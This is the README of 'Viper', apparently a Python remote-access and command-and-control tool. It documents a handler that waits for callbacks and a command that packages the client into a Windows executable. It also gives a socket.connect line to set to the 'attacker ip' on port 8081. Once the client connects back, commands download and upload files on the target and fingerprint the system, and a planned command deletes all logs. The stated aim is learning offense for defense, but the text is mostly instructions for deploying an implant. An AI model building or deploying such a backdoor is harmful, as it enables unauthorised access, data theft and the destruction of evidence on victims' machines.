***VIPER***


Viper is designed in order to retrieve compromised files, processes, and services in case you have to reach out and grab information quickly. 
The viper can also be used for testing exploitation and enumeration for the purpose of learning offensive for defensive actions.

Viper also has team server capabilities *I am still working out bugs but it works great currently with command line

This program was created as a basic function to reach out and grab things fast! Powered by twisted python. 

I have recently added a twisted webserver and chat server for teamdevops


viper has been tested on kali 2.0 x86

***Instalation instructions***

The installer.sh should install everything for you

Important note: You may want to take a virtual-image snapshot before running installer.sh. This should work perfectly though. 

***Install commands***

```
navigate to vipers root directory
$>chmod +x installer.sh
$>./installer.sh

```

The installer will back up your ~/.bashrc file and This should do the tricks and get you up and running. 

You will need to verify the installer adds the python path to the end of the ~/.bashrc

Quick pythonpath help commands. This should be done for you while doing instalation. I still have to confirm this again

```
echo export PYTHONPATH="" >> ~/.bashrc
source ~/.bashrc

```

***libraries installed and current requirements check install.sh for mods***

```
python-twisted +16.6;
PyCrypto;
pyOpenSSl;
Zope interface;
python 2.7;
python-2.7.13.msi;
pyinstaller-3.1.1;
future-0.16.0;
wine;
winetricks;

```

***Usage:***

***to start the viper console:***

```
$$> chmod +x start-teamserver.sh
$$> ./start-teamserver.sh
```

***usage:***

start the handler first and then start the client on the target machine

viper main commands:

```
[*] handler ========= > "starts the viper server and waits for a call back" 
[*] buildfang ========= > "creates a basic exe file from viperclient.py and stores it inside payloads"; 
[*] chatserver ========= > will start your chat server on port 8123. You will have to open a new terminal to connect
[*] stopchat ========= > will tear down the chat server when needed
[*] startweb ========= > starts the webserver
[*] stopweb ========= > stops the webserver
```

***build fang pre-instructions***

Inside viper client modify these two lines with your local ip address

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('address you want to connect back to, attacker ip', 8081))


***viper connection commands:***

use these once you get the call back from the client. first you will need to enter in the local host and port number that you assigned to the client before deploying. 

```
[*] download ========= > downloads a file from the client machine (ex: download #source #dest);
[*] upload   ========= > uploads a file to the client machine (ex: upload #source #dest);
[*] getenv       ========= >  prints the system information";
[*] getuid       ========= > Get the user level access of the shell";
[*] SystemInfo   ========= > Get Fingerprint of the system"; todo
[*] capture      ========= > take images of the host machine "; todo
[*] Cover        ========= > Delete all traces of logs"; todo
```

*important note: to upload or download source or dest must be full file paths with file names or program may currently break. #working on this.
